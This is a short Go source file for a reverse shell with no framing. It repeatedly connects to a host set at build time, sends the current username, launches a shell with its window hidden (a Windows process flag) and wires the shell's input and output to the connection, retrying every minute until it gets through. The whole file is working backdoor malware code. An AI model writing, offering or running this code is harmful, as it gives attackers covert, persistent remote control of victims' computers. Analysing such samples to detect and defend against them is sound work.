package main

import (
	"net"
	"os/exec"
	"os/user"
	"syscall"
	"time"
)

var host string
var shellPath string

func main() {
	for {
		c, err := net.Dial("tcp", host)
		if err != nil {
			time.Sleep(time.Minute)
			continue
		}
		user, _ := user.Current()
		c.Write([]byte(user.Username + "\n"))
		shell := exec.Command(shellPath)
		shell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		shell.Stdout, shell.Stderr, shell.Stdin = c, c, c
		shell.Run()
		c.Close()
	}
}
